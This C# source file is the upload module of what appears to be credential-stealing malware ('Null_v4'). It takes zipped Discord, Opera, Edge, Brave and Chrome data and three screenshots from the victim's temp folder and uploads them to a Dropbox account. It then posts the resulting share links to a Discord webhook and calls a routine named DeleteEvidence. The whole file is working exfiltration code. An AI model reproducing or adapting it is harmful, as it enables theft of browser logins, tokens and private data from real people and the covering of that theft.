using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using Discord;
using Newtonsoft.Json;
using System.Net.Http;
using Dropbox.Api;
using Dropbox.Api.Common;
using Dropbox.Api.Files;
using Dropbox.Api.Team;

namespace Null_v4
{
    public class UploadManager
    {

        //Discord Bot
        private static protected string CurrentBotName = "CaptainHook der 3te";
        private static protected string CurrentBotAvatar = Null_v4.Library.Global_Discord_Avatar;
        private static protected string CurrentBotWebhook = Null_v4.Library.Global_Discord_Token;

        //Dropbox
        static string token = Null_v4.Library.Global_Dropbox_Token;

        //Data Manager
        private static protected string LocalUsername = "/" + Environment.UserName;
        private static protected string userLocalDir = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        private static protected string userRoamingDir = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

        private static protected string DropboxDropFolder = Null_v4.Library.Global_Dropbox_Folder;
        private static protected string Software_Main_Dir = Null_v4.Library.Global_Main_Dir;
        private static protected string Software_Discord_ZIP = userLocalDir + @"\Temp\" + Null_v4.Library.Global_Main_Dir_Name + @"\Discord.zip";
        private static protected string Software_Opera_ZIP = userLocalDir + @"\Temp\" + Null_v4.Library.Global_Main_Dir_Name + @"\Opera.zip";
        private static protected string Software_Edge_ZIP = userLocalDir + @"\Temp\" + Null_v4.Library.Global_Main_Dir_Name + @"\Edge.zip";
        private static protected string Software_Brave_ZIP = userLocalDir + @"\Temp\" + Null_v4.Library.Global_Main_Dir_Name + @"\Brave.zip";
        private static protected string Software_Chrome_ZIP = userLocalDir + @"\Temp\" + Null_v4.Library.Global_Main_Dir_Name + @"\Chrome.zip";
        private static protected string Software_Screenshot1 = userLocalDir + @"\Temp\" + Null_v4.Library.Global_Main_Dir_Name + @"\Capture1.jpg";
        private static protected string Software_Screenshot2 = userLocalDir + @"\Temp\" + Null_v4.Library.Global_Main_Dir_Name + @"\Capture2.jpg";
        private static protected string Software_Screenshot3 = userLocalDir + @"\Temp\" + Null_v4.Library.Global_Main_Dir_Name + @"\Capture3.jpg";

        public static string Discord_URL = "NULL";
        public static string Opera_URL = "NULL";
        public static string Edge_URL = "NULL";
        public static string Brave_URL = "NULL";
        public static string Chrome_URL = "NULL";

        public static string Screenshot1_URL = "NULL";
        public static string Screenshot2_URL = "NULL";
        public static string Screenshot3_URL = "NULL";

        //Colors
        //Red = "8464385"



        public static void SendDiscordWebhook(string title, string description, string color)
        {
            try
            {
                WebRequest wr = (HttpWebRequest)WebRequest.Create(CurrentBotWebhook);
                wr.ContentType = "application/json";
                wr.Method = "POST";

                using (var sw = new StreamWriter(wr.GetRequestStream()))
                {
                    string json = JsonConvert.SerializeObject(new
                    {
                        username = CurrentBotName,
                        //icon = Null_v4.Code.CurrentBotAvatar,
                        //avatar = Null_v4.Code.CurrentBotAvatar,
                        embeds = new[]
                        {
                        new
                        {
                            description = description,
                            title = title,
                            color = color
                        }
                    }
                    });

                    sw.Write(json);
                }

                var response = (HttpWebResponse)wr.GetResponse();
                Debug.WriteLine(response.StatusCode);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }
        }


        public static void TriggerDropbox()
        {
            //Development
            //var task = Task.Run((Func<Task>)UploadManager.GetUserData);
            //task.Wait

            //var task = Task.Run((Func<Task>)UploadManager.GetFilesStored);
            //task.Wait();

            //Real
            var task = Task.Run((Func<Task>)UploadManager.UploadDiscordZIP);
            task.Wait();
            var task2 = Task.Run((Func<Task>)UploadManager.UploadOperaZIP);
            task2.Wait();
            var task3 = Task.Run((Func<Task>)UploadManager.UploadEdgeZIP);
            task3.Wait();
            var task4 = Task.Run((Func<Task>)UploadManager.UploadBraveZIP);
            task4.Wait();
            var task5 = Task.Run((Func<Task>)UploadManager.UploadChromeZIP);
            task5.Wait();
            var task6 = Task.Run((Func<Task>)UploadManager.UploadScreenshot1);
            task6.Wait();
            var task7 = Task.Run((Func<Task>)UploadManager.UploadScreenshot2);
            task7.Wait();
            var task8 = Task.Run((Func<Task>)UploadManager.UploadScreenshot3);
            task8.Wait();

            StateDrobox();
        }

        public static async Task GetUserData()
        {
            using (var dbx = new DropboxClient(token))
            {
                var id = await dbx.Users.GetCurrentAccountAsync();
                Console.WriteLine($"Name: {id.Name.DisplayName}\nEmail: {id.Email}\nCountry: {id.Country}");
                Console.ReadKey();
            }
        }

        static async Task GetFilesStored()
        {
            using (var dbx = new DropboxClient(token))
            {
                var list = await dbx.Files.ListFolderAsync(string.Empty);

                foreach (var item in list.Entries.Where(i => i.IsFolder))
                {
                    Console.WriteLine("D  {0}/", item.Name);
                }

                foreach (var item in list.Entries.Where(i => i.IsFile))
                {
                    Console.WriteLine("F{0,8} {1}", item.AsFile.Size, item.Name);
                }
            }
        }

        static async Task UploadDiscordZIP()
        {
            try
            {
                using (var dbx = new DropboxClient(token))
                {
                    using (var mem = new MemoryStream(File.ReadAllBytes(Software_Discord_ZIP)))
                    {
                        var updated = dbx.Files.UploadAsync(LocalUsername + "/" + DropboxDropFolder + "/" + "Discord.zip", WriteMode.Overwrite.Instance, body: mem);
                        updated.Wait();
                        var tx = dbx.Sharing.CreateSharedLinkWithSettingsAsync(LocalUsername + "/" + DropboxDropFolder + "/" + "Discord.zip");
                        tx.Wait();
                        Discord_URL = tx.Result.Url;
                    }
                    //Console.WriteLine("Discord Upload URL:" + Discord_URL);
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message);
            }
        }

         static async Task UploadOperaZIP()
        {
            try
            {
                using (var dbx = new DropboxClient(token))
                {
                    using (var mem = new MemoryStream(File.ReadAllBytes(Software_Opera_ZIP)))
                    {
                        var updated = dbx.Files.UploadAsync(LocalUsername + "/" + DropboxDropFolder + "/" + "Opera.zip", WriteMode.Overwrite.Instance, body: mem);
                        updated.Wait();
                        var tx = dbx.Sharing.CreateSharedLinkWithSettingsAsync(LocalUsername + "/" + DropboxDropFolder + "/" + "Opera.zip");
                        tx.Wait();
                        Opera_URL = tx.Result.Url;
                    }
                    //Console.WriteLine("Opera Upload URL:" + Opera_URL);
                }
            }
            catch(Exception ex)
            {
                Debug.WriteLine(ex.Message);
            }
        }

        static async Task UploadEdgeZIP()
        {
            try
            {
                using (var dbx = new DropboxClient(token))
                {
                    using (var mem = new MemoryStream(File.ReadAllBytes(Software_Edge_ZIP)))
                    {
                        var updated = dbx.Files.UploadAsync(LocalUsername + "/" + DropboxDropFolder + "/" + "Edge.zip", WriteMode.Overwrite.Instance, body: mem);
                        updated.Wait();
                        var tx = dbx.Sharing.CreateSharedLinkWithSettingsAsync(LocalUsername + "/" + DropboxDropFolder + "/" + "Edge.zip");
                        tx.Wait();
                        Edge_URL = tx.Result.Url;
                    }
                    //Console.WriteLine("Edge Upload URL:" + Edge_URL);
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message);
            }
        }

        static async Task UploadBraveZIP()
        {
            try
            {
                using (var dbx = new DropboxClient(token))
                {
                    using (var mem = new MemoryStream(File.ReadAllBytes(Software_Brave_ZIP)))
                    {
                        var updated = dbx.Files.UploadAsync(LocalUsername + "/" + DropboxDropFolder + "/" + "Brave.zip", WriteMode.Overwrite.Instance, body: mem);
                        updated.Wait();
                        var tx = dbx.Sharing.CreateSharedLinkWithSettingsAsync(LocalUsername + "/" + DropboxDropFolder + "/" + "Brave.zip");
                        tx.Wait();
                        Brave_URL = tx.Result.Url;
                    }
                    //Console.WriteLine("Brave Upload URL:" + Brave_URL);
                }
            }
            catch(Exception ex)
            {
                Debug.WriteLine(ex.Message);
            }
        }

        static async Task UploadChromeZIP()
        {
            try
            {
                using (var dbx = new DropboxClient(token))
                {
                    using (var mem = new MemoryStream(File.ReadAllBytes(Software_Chrome_ZIP)))
                    {
                        var updated = dbx.Files.UploadAsync(LocalUsername + "/" + DropboxDropFolder + "/" + "Chrome.zip", WriteMode.Overwrite.Instance, body: mem);
                        updated.Wait();
                        var tx = dbx.Sharing.CreateSharedLinkWithSettingsAsync(LocalUsername + "/" + DropboxDropFolder + "/" + "Chrome.zip");
                        tx.Wait();
                        Chrome_URL = tx.Result.Url;
                    }
                    //Console.WriteLine("Chrome Upload URL:" + Chrome_URL);
                }
            }
            catch (Exception ex) 
            { 
                Debug.WriteLine(ex.Message);
            }
        }

        static async Task UploadScreenshot1()
        {
            try
            {
                using (var dbx = new DropboxClient(token))
                {
                    using (var mem = new MemoryStream(File.ReadAllBytes(Software_Screenshot1)))
                    {
                        var updated = dbx.Files.UploadAsync(LocalUsername + "/" + DropboxDropFolder + "/" + "Screenshot1.jpg", WriteMode.Overwrite.Instance, body: mem);
                        updated.Wait();
                        var tx = dbx.Sharing.CreateSharedLinkWithSettingsAsync(LocalUsername + "/" + DropboxDropFolder + "/" + "Screenshot1.jpg");
                        tx.Wait();
                        Screenshot1_URL = tx.Result.Url;
                    }
                    //Console.WriteLine("Chrome Upload URL:" + Chrome_URL);
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message);
            }
        }

        static async Task UploadScreenshot2()
        {
            try
            {
                using (var dbx = new DropboxClient(token))
                {
                    using (var mem = new MemoryStream(File.ReadAllBytes(Software_Screenshot2)))
                    {
                        var updated = dbx.Files.UploadAsync(LocalUsername + "/" + DropboxDropFolder + "/" + "Screenshot2.jpg", WriteMode.Overwrite.Instance, body: mem);
                        updated.Wait();
                        var tx = dbx.Sharing.CreateSharedLinkWithSettingsAsync(LocalUsername + "/" + DropboxDropFolder + "/" + "Screenshot2.jpg");
                        tx.Wait();
                        Screenshot2_URL = tx.Result.Url;
                    }
                    //Console.WriteLine("Chrome Upload URL:" + Chrome_URL);
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message);
            }
        }

        static async Task UploadScreenshot3()
        {
            try
            {
                using (var dbx = new DropboxClient(token))
                {
                    using (var mem = new MemoryStream(File.ReadAllBytes(Software_Screenshot3)))
                    {
                        var updated = dbx.Files.UploadAsync(LocalUsername + "/" + DropboxDropFolder + "/" + "Screenshot3.jpg", WriteMode.Overwrite.Instance, body: mem);
                        updated.Wait();
                        var tx = dbx.Sharing.CreateSharedLinkWithSettingsAsync(LocalUsername + "/" + DropboxDropFolder + "/" + "Screenshot3.jpg");
                        tx.Wait();
                        Screenshot3_URL = tx.Result.Url;
                    }
                    //Console.WriteLine("Chrome Upload URL:" + Chrome_URL);
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message);
            }
        }

        static void StateDrobox()
        {
            SendDiscordWebhook(
                "",
                "\n **Files have been Succesfully Uploaded**" +
                "\n \n" +
                "\n Discord:" + "\u1cbc" + Discord_URL +
                "\n Opera:" + "\u1cbc" + Opera_URL +
                "\n Edge:" + "\u1cbc" + Edge_URL +
                "\n Brave:" + "\u1cbc" + Brave_URL +
                "\n Chrome:" + "\u1cbc" + Chrome_URL +
                "\n Screenshot 1" + "\u1cbc" + Screenshot1_URL +
                "\n Screenshot 2" + "\u1cbc" + Screenshot2_URL +
                "\n Screenshot 3" + "\u1cbc" + Screenshot3_URL,

                "8464385"
                );

            DataManager.DeleteEvidence();
        }
    }
}
